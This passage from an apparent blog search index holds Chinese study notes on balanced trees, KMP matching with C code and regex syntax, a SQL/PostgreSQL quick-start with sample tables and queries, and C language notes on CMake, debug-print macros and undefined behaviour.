向上合并为3-节点, 树高度减 $1$. 问题: 需要维护3种不同节点, 维持平衡的转换较复杂.\nLLRB树: 将2-3树中3-节点拆分为两个2-节点, 规定左侧节点为红色, 右侧节点及原本2-节点均为黑色, 红色节点不计入高度. 平衡规则: 红节点只会出现在左孩, 不会出现连续的红节点相连; 左右子树黑色高度相等. 插入(红色调整): 新节点总为红色; 红节点在右孩时, 左旋并调整颜色; 连续红节点相连时, 右旋并调整颜色; 左右孩均为红节点时, 颜色反转; 根节点设置为黑色. 删除(黑色调整): 红节点可直接删除; 删除黑节点时调整递归路径为红黑相间使得待删除黑节点变为红色, 递归返回时调整为平衡.\nRB树: 将2-3-4树中3-节点拆分为红节点和黑节点, 4-节点拆分为2个红节点和黑节点, 红色结点不计入高度. 平衡规则: 根节点黑色; 红色节点左右两孩均为黑色; 左右子树黑色高度相等.\n区间树:\n关联式容器: 基于RB树; 存储key(键)或key-value(键值)对; 所有元素自动排序; key不能修改. 方法: iterator, insert(), erase(), find(), clear(). set: 不允许出现重复key. multiset: 允许key冗余, find()返回找到的第一个. map: 不允许出现重复key; 元素为pair类型; [] 可根据key读取value; value可修改. multimap: 允许key冗余, find()返回找到的第一个.\n索引与B+树 (未完) 持久化介质中, 同时需要大量查询和插入, 采用弱平衡 $n$ 叉树, 减少“旋转”和数据迁移次数; 在数据库索引和文件索引中广泛使用.\nB树\nB+树\nLSM树\nmaple树\nHash表 (未完) 回溯及衍生问题 (未完) 回溯是树形结构的遍历式查找.\n二叉树属性/修改/构造 - 树的递归遍历方式. 叶子数/左下角值/路径总和 - 均可. 所有路径/翻转/构造/最大二叉树/合并二叉树 - 前序. 是否对称/最大深度/最小深度/节点数/是否平衡/公共祖先 - 后序. 二叉搜索树插入/删除/修剪/构造 - 前序. 二叉搜索树判断/最小绝对差/众数/转换为累加树 - 中序.\n串 模式匹配 KMP算法 模式匹配: 在文本串中匹配第一次出现模式串的位置. BF算法: 暴力匹配 - 时间复杂度 $O(nm)$. KMP算法: 避免重复匹配; 前缀(next/prefix)数组记录模式串前后缀相等长度 - 即匹配不相等时应当回溯的位置 - 时间复杂度 $O(n+m)$, 空间复杂度 $O(m)$.\n模式串\u0026quot;abcabdfabc\u0026quot;\n\u0026ldquo;a\u0026rdquo;, next[0]=0; \u0026ldquo;ab\u0026rdquo;, next[1]=0; \u0026ldquo;abc\u0026rdquo;, next[2]=0; \u0026ldquo;abca\u0026rdquo;, next[3]=1, 前后缀相等内容 - \u0026ldquo;a\u0026rdquo;; \u0026ldquo;abcab\u0026rdquo;, next[4]=2, 前后缀相等内容 - \u0026ldquo;ab\u0026rdquo;; \u0026ldquo;abcabd\u0026rdquo;, next[5]=0; \u0026ldquo;abcabdf\u0026rdquo;, next[6]=0; \u0026ldquo;abcabdfa\u0026rdquo;, next[7]=1, 前后缀相等内容 - \u0026ldquo;a\u0026rdquo;; \u0026ldquo;abcabdfab\u0026rdquo;, next[8]=2, 前后缀相等内容 - \u0026ldquo;ab\u0026rdquo;; \u0026ldquo;abcabdfabc\u0026rdquo;, next[9]=3, 前后缀相等内容 - \u0026ldquo;abc\u0026rdquo;. next数组: 0 0 0 1 2 0 1 2 3. $-1$: -1 -1 -1 0 1 -1 0 1 2 右移: -1 0 0 0 1 2 0 1 2. 右移后 $+1$: 0 1 1 2 3 1 2 3.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;string.h\u0026gt; void getNext(const char str[], int next[], int len) { int j = 0; next[0] = 0; for (int i = 1; i \u0026lt; len; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; str[i] != str[j]) j = next[j - 1]; if (str[i] == str[j]) ++j; next[i] = j; } } int strStr(const char haystack[], const char needle[]) { int nLen = (int) strlen(needle), hLen = (int) strlen(haystack); if (nLen == 0) return 0; int next[nLen]; getNext(needle, next, nLen); int j = 0; for (int i = 0; i \u0026lt; hLen; ++i) { while (j \u0026gt; 0 \u0026amp;\u0026amp; haystack[i] != needle[j]) j = next[j - 1]; if (haystack[i] == needle[j]) ++j; if (j == nLen) return (i - nLen + 1); } return -1; } FA (未完) FA(Finite Automata) 有穷状态自动机\nDFA, NFA\nDFA(Deterministic): 相同的输入总是转移到相同的状态. 机制: 先看字符串再看正则表达式, 不会发生回溯, 即已经匹配过的字符不会匹配多次. 语言: MySQL, awk, egrep, flex, lex.\nNFA(Nondeterministic): 相同输入可以转移到不同状态, 无输入时也可以转移状态. 机制: 先看正则表达式再看字符串, 会发生回溯, 速度较慢. 传统: 分支懒惰; Go, PCRE, Perl, PHP, Java, Python, Ruby, grep, less, more, .Net, vi. POSIX: 分支贪婪; mawk.\n贪婪与懒惰: 限定符默认为贪婪模式; 传统NFA默认为懒惰模式.\n回溯陷阱: NFA实现的语言应当尽量避免回溯的发生以提高性能.\n正则表达式 /pattern/flags: 匹配模式/修饰符\n修饰符 : 默认只匹配第一个 g: 全局匹配 i: 不区分大小写 m: 多行匹配 s: 使 . 中包含\\r\\n u: 能够正确处理UTF-16 y: 从剩余第一个位置开始匹配\n转义符 \\特殊字符: 转义字符, 匹配特殊字符自身\n字符 普通字符: 匹配字符字面意义 \\cx: 匹配x指向的控制符 \\xn: 匹配16进制下ASCII编码中n指向的字符 \\un: 匹配16进制下Unicode编码中n指向的字符 \\f: 匹配换页符, 相当于\\x0c和\\cL \\n: 匹配换行符, 相当于\\x0a和\\cJ \\r: 匹配回车符, 相当于\\x0d和\\cM \\t: 匹配制表符, 相当于\\x09和\\cl \\v: 匹配垂直制表符, 相当于\\x0b和\\cK \\0: 匹配NULL, 相当于\\u0000 [\\b]: 匹配退格符, 相当于\\u0008\n字符类 [ ]: 匹配方括号内任意字符 [ - ]: 匹配方括号内字符范围 [^ ]: 匹配方括号内字符以外的字符 \\d: 匹配任意数字, 等价于[0-9] \\D: 匹配任意非数字, 等价于[^0-9] \\s: 匹配任意控制符, 等价于[\\f\\n\\r\\t\\v] \\S: 匹配任意非控制符, 等价于[^\\f\\n\\r\\t\\v] \\w: 匹配任意数字字母下划线, 等价于[A-Za-z0-9_] \\W: 匹配任意非数字字母下划线, 等价于[^A-Za-z0-9_] .: 通配, 等价于[^\\r\\n\\u2028\\u2029]\n定位符 ^: 匹配字符串开始位置 $: 匹配字符串结束位置 \\b: 匹配单词边界 \\B: 匹配非单词边界 量词：默认贪婪, 匹配尽可能多的字符 *: 匹配前面模式0次或多次 +: 匹配前面模式至少1次 ?: 匹配前面模式至多1次 {n}: 匹配前面模式恰好n次 {n,}: 匹配前面模式至少n次 {n,m}: 匹配前面模式至少n次, 至多m次 ?: 加在限定符后, 惰性, 匹配最少的字符\n分组符 (exp): 分组并捕获子表达式exp (?:exp): 分组但不捕获子表达式exp (exp)\\n: 分组并引用第n个捕获子表达式exp 断言符 exp1(?=exp2): 先行断言, 匹配在exp2前的exp1 exp1(?!exp2): 先行否定断言, 匹配不在exp2前的exp2 (?\u0026lt;=exp2)exp2: 后行断言, 匹配在exp2后的exp1 (?\u0026lt;!exp2)exp2: 后行否定断言, 匹配不在exp2后的exp2\n分支符 |: 匹配前面模式或后面模式\n优先级 转义符 字符类, 分组符, 断言符 量词 定位符, 字符 分支符\n无损压缩 (未完) 游程编码 haffman 树 LZW 算法\n作为String类的串 String类中方法时间复杂度基本均为 $O(n)$ 或 $O(m)$. 迭代器: iterator, reverse_iterator. 赋值方法: =, assign(). 读取方法: [], at(). 拼接方法: +, +=, append(). 分割方法: split(). 查找方法: find(), rfind(). 替换方法: replace(). 比较方法: compare(), \u0026lt;, \u0026lt;=, ==, \u0026gt;, \u0026gt;=, !=. 子串方法: substr(). 增删方法: insert(), erase(). 转换方法: c_str(), to_string(), stoi(), stol(), stoll(), stoul(), stoull(), stof(), stod(), stold().\n衍生问题 串替换: 从后向前填充, 避免逐位移动 - 时间复杂度 $O(n)$. 串反转: 头尾双指针 - 时间复杂度 $O(n)$. 串循环移动: 先整体反转, 再部分反转 - 时间复杂度 $O(n)$. 向左循环移动 $m$ 位: 整体反转后, 前 $n-m$ 位和后 $m$ 位分别反转. 向右循环移动 $m$ 位: 整体反转后, 前 $m$ 位和后 $n-m$ 位分别反转.\n重复子串: 非空字符串是否由一子串重复多次构成 - KMP算法, 时间复杂度 $O(n)$, 空间复杂度 $O(n)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 void getNext (int* next, const string\u0026amp; s){ next[0] = 0; int j = 0; for(int i = 1;i \u0026lt; s.size(); ++i){ while(j \u0026gt; 0 \u0026amp;\u0026amp; s[i] != s[j]) j = next[j - 1]; if(s[i] == s[j]) ++j; next[i] = j; } } // 不妨设子串长度为m, 则有n=xm // next数组即为0 0 ... 1 2 ... n-m bool repeatedSubstringPattern (string s) { if (s.size() == 0) return false; int next[s.size()]; getNext(next, s); int len = s.size(); if (next[len - 1] != 0 \u0026amp;\u0026amp; len % (len - (next[len - 1] )) == 0) return true; return false; } 反转串中单词: 反转串中由空格隔开的单词顺序 - 时间复杂度 $O(n)$, 空间复杂度 $O(1)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // 整体反转 void reverse(string\u0026amp; s, int start, int end){ for (int i = start, j = end; i \u0026lt; j; i++, j--) swap(s[i], s[j]); } // 快慢指针法去除多余空格 void removeExtraSpaces(string\u0026amp; s) { int slow = 0; for (int i = 0; i \u0026lt; s.size(); ++i) { // if (s[i] != \u0026#39; \u0026#39;) { if (slow != 0) s[slow++] = \u0026#39; \u0026#39;; while (i \u0026lt; s.size() \u0026amp;\u0026amp; s[i] != \u0026#39; \u0026#39;) s[slow++] = s[i++]; } } s.resize(slow); } // 单词逐个反转 string reverseWords(string s) { removeExtraSpaces(s); reverse(s, 0, s.size() - 1); int start = 0; for (int i = 0; i \u0026lt;= s.size(); ++i) { if (i == s.size() || s[i] == \u0026#39; \u0026#39;) { reverse(s, start, i - 1); start = i + 1; } } return s; } 图 搜索: bfs, dfs, A*, 并查集\n最小生成树: Prim, Kruskal\n最短路径: Dijkstra, Floyd\n拓扑排序, 关键路径\n动态规划 复杂度陷阱 ","date":"2023-10-12T00:00:00Z","permalink":"https://example.com/p/%E7%AE%97%E6%B3%95%E5%88%9D%E6%AD%A5/","title":"算法初步"},{"content":"PostgreSQL 16.0\n1 2 3 4 5 6 7 \\PostgreSQL\\9.5\\data\\postgresql.conf listen_address = \u0026#39;localhost\u0026#39; \\PostgreSQL\\9.5\\bin\\psql.exe –U postgres \\PostgreSQL\\9.5\\bin\\psql.exe –U postgres -d mydb1 \\q 绪论 RDBMS(Relation Database Management System) 对象: DATABASE; TABLE. DDL(data definition language): CREATE; DROP; ALTER. DML(data Manipulation language): SELECT; INSERT; UPDATE; DELETE. DCL(data control language): COMMIT; ROLLBACK; GRANT; REVOKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- 创建数据库 CREATE DATABASE 数据库名; -- 创建表 CREATE TABLE 表名 (列名 数据类型 数据约束, 列名 数据类型 数据约束, ... 表约束, 表约束, ...); -- 数据约束: NOT NULL, DEFUALT 值 -- 表约束: PRIMARY KEY (列名) -- 删除表 DROP TABLE 表名; -- 变更表名 ALTER TABLE 旧表名 RENAME TO 新表名 -- 添加表列 ALTER TABLE 表名 ADD COLUMN 列定义; -- 删除表列 ALTER TABLE 表名 DROP COLUMN 列名; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -- 插入新数据 INSERT INTO 表名 (列清单) VALUES (值清单); -- 复制数据 INSERT INTO 新表名 (列清单) SELECT 列清单 FROM 源表名 -- 删除数据 DELETE FROM 表名 WHERE 条件; -- 整行 -- 更改数据 UPDATE 表名 SET 列 = 运算式; ..., WHERE 条件; -- 事务(transaction) -- ACID: atomicity, consistency, isolaction, durability BEGIN TRANSACTION; DML语句; ... COMMIT; -- 提交 ROLLBACK; -- 回滚 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 -- e.g. CREATE DATABASE shop; CREATE TABLE Product (product_id CHAR(4) NOT NULL, product_name VARCHAR(100) NOT NULL, product_type VARCHAR(32) NOT NULL, sale_price INTEGER, purchase_price INTEGER, regist_date DATE, PRIMARY KEY (product_id)); BEGIN TRANSACTION; INSERT INTO Product VALUES (\u0026#39;0001\u0026#39;, \u0026#39;T恤衫\u0026#39;, \u0026#39;衣服\u0026#39;, 1000, 500, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0002\u0026#39;, \u0026#39;打孔器\u0026#39;, \u0026#39;办公用品\u0026#39;, 500, 320, \u0026#39;2009-09-11\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0003\u0026#39;, \u0026#39;运动T恤\u0026#39;, \u0026#39;衣服\u0026#39;, 4000, 2800, NULL); INSERT INTO Product VALUES (\u0026#39;0004\u0026#39;, \u0026#39;菜刀\u0026#39;, \u0026#39;厨房用具\u0026#39;, 3000, 2800, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0005\u0026#39;, \u0026#39;高压锅\u0026#39;, \u0026#39;厨房用具\u0026#39;, 6800, 5000, \u0026#39;2009-01-15\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0006\u0026#39;, \u0026#39;叉子\u0026#39;, \u0026#39;厨房用具\u0026#39;, 500, NULL, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0007\u0026#39;, \u0026#39;擦菜板\u0026#39;, \u0026#39;厨房用具\u0026#39;, 880, 790, \u0026#39;2008-04-28\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0008\u0026#39;, \u0026#39;圆珠笔\u0026#39;, \u0026#39;办公用品\u0026#39;, 100, NULL,\u0026#39;2009-11-11\u0026#39;); COMMIT; 基础查询方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 -- 列查询 SELECT 运算式, 运算式, ... FROM 表名; -- 全部列 SELECT * FROM 表名; -- 去除重复行 SELECT DISTINCT 运算式, ... FROM 表名; -- 列别名 SELECT 运算式 AS \u0026#34;中文列名\u0026#34;, 运算式 AS 英文列名, ... FROM 表名; -- NULL运算均会得到NULL -- 常数 SELECT 常数 AS 列名, ... FROM 表名; -- 行条件 SELECT 运算式, ... FROM 表名 WHERE 条件; /* 比较运算符 = 相等 \u0026lt;\u0026gt; 不相等 IS NULL 值为NULL IS NOT NULL 值不为NULL */ /* 逻辑运算符 NOT 非 AND 和 OR 或 */ /* 逻辑值 TRUE FALSE UNKNOWN 判断NULL时 */ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 -- 聚合函数: COUNT, SUM, AVG, MAX, MIN -- 分组 SELECT 表达式, ... FROM 表名 GROUP BY 列名(聚合键), ... HAVING 条件; -- 排序 SELECT 表达式, ... FROM 表名 ORDER BY 列名(排序键) ASC, ... -- 缺省/ASC为升序, DESC为降序 /* 书写顺序: SELECT-\u0026gt;FROM-\u0026gt;WHERE-\u0026gt;GROUP BY-\u0026gt;HAVING-\u0026gt;ORDER BY 执行顺序: FROM-\u0026gt;WHERE-\u0026gt;GROUP BY-\u0026gt;HAVING-\u0026gt;SELECT-\u0026gt;ORDER BY WHERE为行指定条件, HAVING为聚合结果指定条件 使用聚合时SELECT只能包含常数, 聚合函数, 聚合键 GROUP BY不能有别名, 结果无序 WHERE中不能使用聚合函数, GROUP BY和HAVING可以 */ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 -- e.g. SELECT purchase_price, COUNT(*) FROM Product WHERE product_type = \u0026#39;衣服\u0026#39; GROUP BY purchase_price; SELECT product_type, AVG(sale_price) FROM Product GROUP BY product_type HAVING AVG(sale_price) \u0026gt;= 2500; SELECT product_id, product_name, sale_price, purchase_price FROM Product ORDER BY sale_price DESC, product_id; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* 视图: 存储SELECT语句的表 避免视图嵌套, 定义视图不能使用ORDER BY, 视图和表需要同时更新 */ -- 创建视图 CREATE VIEW 视图名 (视图列名, ...) AS SELECT语句; -- 删除视图 DROP VIEW 视图名; -- 子查询: 临时视图 (SELECT 运算式 AS 视图列名, ... WHERE 条件 FROM 表名 GROUP BY 列名(聚合键), ... HAVING 条件) AS 视图名 /* 标量子查询: 只返回值, 可用于表达式 SELECT需要包含常数, 聚合键, 聚合函数以外的运算式时 WHERE需要使用聚合函数时 HAVING使用聚合函数需要作用范围不同时 */ -- 关联子查询: 细分组内比较 (SELECT 运算式 AS 视图列名, ... FROM 表名 AS 别名 WHERE 别名.列名 = 别名.列名) -- 结合条件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -- e.g. CREATE VIEW ProductSum (product_type, cnt_product) AS SELECT product_type, COUNT(*) FROM Product GROUP BY product_type; SELECT product_type, cnt_product FROM ProductSum; SELECT product_type, cnt_product FROM (SELECT product_type, COUNT(*) AS cnt_product FROM Product GROUP BY product_type ) AS ProductSum; SELECT product_type, AVG(sale_price) FROM Product GROUP BY product_type HAVING AVG(sale_price) \u0026gt; (SELECT AVG(sale_price) FROM Product); SELECT product_type, product_name, sale_price FROM Product AS P1 WHERE sale_price \u0026gt; (SELECT AVG(sale_price) FROM Product AS P2 WHERE P1.product_type = P2.product_type GROUP BY product_type); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /* 函数: 输入参数, 输出返回值 数值: ABS, MOD, ROUND 字符串: LENGTH, CONCAT, LOWER, UPPER, REPLACE, SUBSTRING(... FROM ... FOR ...) 日期: CURRENT_DATE, CURRENT_TIME, CURRENT_TIMESTAMP, EXTRACT(... FROM ...) 转换: CAST(... AS ...), COALESCE(NULL, ... )返回第一个不为NULL值 */ /* 谓词: 返回逻辑值的函数 模式匹配: LIKE, 前方一致 \u0026#39;...%\u0026#39;, 中间一致 \u0026#39;%...%\u0026#39;, 后方一致 \u0026#39;%...\u0026#39; 范围: BETWEEN ... AND ... 指定/排除多个: IN (..., ...), NOT IN(..., ...), 输入参数可为表 判断记录存在: EXISTS, NOT EXISTS */ -- 条件分支 CASE WHEN 条件 THEN 表达式 ... ELSE 表达式 END 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 -- e.g. CREATE TABLE ShopProduct (shop_id CHAR(4) NOT NULL, shop_name VARCHAR(200) NOT NULL, product_id CHAR(4) NOT NULL, quantity INTEGER NOT NULL, PRIMARY KEY (shop_id, product_id)); BEGIN TRANSACTION; INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0001\u0026#39;, 30); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0002\u0026#39;, 50); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0003\u0026#39;, 15); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0002\u0026#39;, 30); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0003\u0026#39;, 120); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0004\u0026#39;, 20); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0006\u0026#39;, 10); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0007\u0026#39;, 40); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0003\u0026#39;, 20); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0004\u0026#39;, 50); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0006\u0026#39;, 90); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0007\u0026#39;, 70); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000D\u0026#39;, \u0026#39;福冈\u0026#39;, \u0026#39;0001\u0026#39;, 100); COMMIT; SELECT product_name, sale_price FROM Product WHERE product_id NOT IN (SELECT product_id FROM ShopProduct WHERE shop_id = \u0026#39;000A\u0026#39;); SELECT product_name, sale_price FROM Product AS P WHERE NOT EXISTS (SELECT * FROM ShopProduct AS SP WHERE SP.shop_id = \u0026#39;000A\u0026#39; AND SP.product_id = P.product_id); SELECT SUM(CASE WHEN product_type = \u0026#39;衣服\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_clothes, SUM(CASE WHEN product_type = \u0026#39;厨房用具\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_kitchen, SUM(CASE WHEN product_type = \u0026#39;办公用品\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_office FROM Product; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 行运算: UNION, INTERSECT, EXCEPT 运算式数量及类型一致, ORDER BY只能加在最后 保留重复行: 行运算+ALL */ SELECT 运算式 FROM 表名 行运算 SELECT 运算式 FROM 表名; /* 列运算 内联结: JOIN 同时存在 外联结: RIGHT/LEFT OUTER JOIN 决定主表 交叉联结: CROSS JOIN 直积 */ SELECT 别名.运算式, ... FROM 表名 AS 别名 INNER JOIN ... ON 条件(联结键) 1 2 3 4 5 6 7 8 9 10 11 -- e.g. SELECT product_id, product_name FROM Product2 EXCEPT SELECT product_id, product_name FROM Product ORDER BY product_id; SELECT SP.shop_id, SP.shop_name, SP.product_id, P.product_name, P.sale_price FROM ShopProduct AS SP RIGHT OUTER JOIN Product AS P ON SP.product_id = P.product_id; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 窗口函数 OLAP(OnLine Analytical Processing) 排序: RANK()相同位次跳过, DENSE_RANK相同位次不跳过, ROW_NUMBER唯一连续位次 聚合: SUM累计, AVG移动平均 ROWS BETWEEN ... PRECEDING AND ... FOLLOWING框架 */ -- 多级聚合 GROUP BY 列名, ... WITH ROLLUP -- 相当于如下 GROUP BY ( ), GROUP BY (列名1), GROUP BY(列名1, 列名2), ... -- 区分聚合与原值 GROUPING (列名) -- 超级分组返回1, 原值NULL返回0 GROUPING(列名1, 列名2, 列名3) -- 相当于如下 GROUPING(列名3) + (GROUPING(列名2) \u0026lt;\u0026lt; 1) + (GROUPING(列名3) \u0026lt;\u0026lt; 2) -- 积木 (多维) GROUP BY 列名, ... WITH CUBE -- 取得全部组合的聚合结果: 2^(列名数) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- e.g. SELECT product_name, product_type, sale_price, RANK () OVER (ORDER BY sale_price) AS ranking FROM Product ORDER BY ranking; SELECT product_type, regist_date, SUM(sale_price) AS sum_price FROM Product GROUP BY ROLLUP(product_type, regist_date); SELECT CASE WHEN GROUPING(product_type) = 1 THEN \u0026#39;商品种类 合计\u0026#39; ELSE product_type END AS product_type, CASE WHEN GROUPING(regist_date) = 1 THEN \u0026#39;登记日期 合计\u0026#39; ELSE CAST(regist_date AS VARCHAR(16)) END AS regist_date, SUM(sale_price) AS sum_price FROM Product GROUP BY ROLLUP(product_type, regist_date); 进阶查询技巧 RDB ","date":"2023-09-24T00:00:00Z","permalink":"https://example.com/p/sql%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"SQL快速入门"},{"content":"请注意: 这是一个过时的blog, 内容问题较多, 全新的C杂谈在编写中.\n(C11 - GCC13.1.0/MSVC1937) 内容不分先后顺序, 请按需查阅. CMAKE 使用CLion或VS时, 可以考虑如下CMAKE配置; 会自动获取项目名与文件名, 每次修改项目名文件名或新建文件时, 只需重新加载CMAKE. 请注意, 如下写法并非现代用法.\n1 2 3 4 5 6 7 8 9 10 11 12 13 cmake_minimum_required(VERSION 3.26) get_filename_component(ProjectId ${CMAKE_CURRENT_SOURCE_DIR} NAME) string(REPLACE \u0026#34; \u0026#34; \u0026#34;_\u0026#34; ProjectId ${ProjectId}) project(${ProjectId} C) set(CMAKE_C_STANDARD 11) file(GLOB files \u0026#34;${CMAKE_CURRENT_SOURCE_DIR}/*.c\u0026#34;) foreach(file ${files}) get_filename_component(name ${file} NAME) add_executable(${name} ${file}) endforeach() 添加头文件:\n1 include_directories(\u0026#34;头文件相对路径\u0026#34;) 此外, 还可以修改C标准版本:\n1 set(CMAKE_C_STANDARD 99) 一个方便调试的头文件 该头文件中定义用变长参数定义了一系列输出函数, 可以直接采用\u0026quot;PRINT_TYPE(variable);\u0026ldquo;的形式来打印对应类型的变量并换行. 传入数组时, 传入的是数组的首位指针, 还需在外部获取数组长度一并传入.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #ifndef BASICC_IO_UTILS_IO_UTILS_H_ #define BASICC_IO_UTILS_IO_UTILS_H_ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; void PrintBinary(unsigned int value); //#define PRINT_METADATA #ifdef PRINT_METADATA # define PRINTLNF(format, ...) printf(\u0026#34;(\u0026#34;__FILE__\u0026#34;:%d) %s: \u0026#34;format\u0026#34;\\n\u0026#34;, __LINE__, __FUNCTION__ , ##__VA_ARGS__) #else # define PRINTLNF(format, ...) printf(format\u0026#34;\\n\u0026#34;, ##__VA_ARGS__) #endif #define PRINT_CHAR(char_value) PRINTLNF(#char_value\u0026#34;: %c\u0026#34;, char_value) #define PRINT_WCHAR(char_value) PRINTLNF(#char_value\u0026#34;: %lc\u0026#34;, char_value) #define PRINT_INT(int_value) PRINTLNF(#int_value\u0026#34;: %d\u0026#34;, int_value) #define PRINT_LONG(long_value) PRINTLNF(#long_value\u0026#34;: %ld\u0026#34;, long_value) #define PRINT_LLONG(long_value) PRINTLNF(#long_value\u0026#34;: %lld\u0026#34;, long_value) #define PRINT_BINARY(int_value) PrintBinary((unsigned int) int_value); #define PRINT_HEX(int_value) PRINTLNF(#int_value\u0026#34;: %#x\u0026#34;, int_value) #define PRINT_BOOL(bool_value) PRINTLNF(#bool_value\u0026#34;: %s\u0026#34;, bool_value ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;) #define PRINT_DOUBLE(double_value) PRINTLNF(#double_value\u0026#34;: %g\u0026#34;, double_value) #define PRINT_STRING(string_value) PRINTLNF(#string_value\u0026#34;: %s\u0026#34;, string_value) #define PRINT_ARRAY(format, array, length) \\ { int array_index; \\ for (array_index = 0; array_index \u0026lt; length; ++array_index) { \\ printf(format, array[array_index]); \\ };\\ printf(\u0026#34;\\n\u0026#34;); } #define PRINT_INT_ARRAY_LN(array, length) \\ { int i; \\ for (i = 0; i \u0026lt; length; ++i) { \\ PRINTLNF(#array\u0026#34;[%d]: %d\u0026#34;, i, array[i]); \\ }} #define PRINT_INT_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%d, \u0026#34;, array, length) #define PRINT_CHAR_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%c, \u0026#34;, array, length) #define PRINT_DOUBLE_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%g, \u0026#34;, array, length) #endif //BASICC_IO_UTILS_IO_UTILS_H_ 来自: https://www.bennyhuo.com/\n赋值语句 在赋值语句中, 左值(\u0026quot;=\u0026ldquo;左边)必须是一个变量或说内存, 不能为数值; 右值(\u0026quot;=\u0026ldquo;右边)可以为数值或变量. 1 2 3 4 5 int *p = \u0026amp;a; *p = 2; // 合法 *(p+1) = 3; // 合法 \u0026amp;a = p; // 非法, \u0026amp;a为变量a的地址, 是数值 *p+1 = 4; // 非法, *p解引用, *p+1为p指向的内存中的数据+1, 是数值 1 2 3 4 5 int array[] = {0,1,2,3}; int *p = array; *p = 10; // 合法 *p++ = 20; // 合法 *++p = 30; // 合法 副作用: 表达式不仅计算数值还修改了环境; 序点间对对象同时读写, 则读必须为了写, 否则为未定义行为.\n1 2 3 4 5 i = i + 1; // 合法 ++i; // 合法 i = (++i)+(i++); // 未定义 a[i] = i++; // 未定义 i = 1 + i++; // 未定义 参考: https://zh.cppreference.com/w/c/language/eval_order\n不同数据类型的运算 该部分内容待更新 整型提升: 表达式中存在(unsigned) int, 则 (unsigned) char, (unsigned) short int, enum 均转换为int, 不足时转换为 unsigned int.\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(){ char ch = \u0026#39;a\u0026#39;; short st = 4; int i = 0; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ch+st),sizeof(i)); return 0; } 隐式转换: 算术表达式: 低类型转换为高类型, int 